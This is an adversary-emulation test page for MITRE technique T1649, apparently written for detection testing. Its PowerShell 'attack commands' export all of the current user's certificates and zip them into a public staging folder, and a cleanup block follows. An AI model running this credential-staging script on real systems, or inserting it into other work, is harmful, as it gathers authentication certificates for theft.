---
tags: [T1649, atomic_test]
filename: "[[T1649 - Steal or Forge Authentication Certificates]]"
---
# T1649 - Steal or Forge Authentication Certificates

## Atomic Test #1 - Staging Local Certificates via Export-Certificate
Export all user certificates and add to a compressed archive.

**Supported Platforms:** Windows


**auto_generated_guid:** eb121494-82d1-4148-9e2b-e624e03fbf3d






#### Attack Commands: Run with `powershell`! 


```powershell
$archive="$env:PUBLIC\T1649\atomic_certs.zip"
$exfilpath="$env:PUBLIC\T1649\certs"
Add-Type -assembly "system.io.compression.filesystem"
Remove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore
mkdir $exfilpath | Out-Null
foreach ($cert in (gci Cert:\CurrentUser\My)) { Export-Certificate -Cert $cert -FilePath $exfilpath\$($cert.FriendlyName).cer}
[io.compression.zipfile]::CreateFromDirectory($exfilpath, $archive)
```

#### Cleanup Commands:
```powershell
$exfilpath="$env:PUBLIC\T1649\certs"
Remove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore
```





<br/>
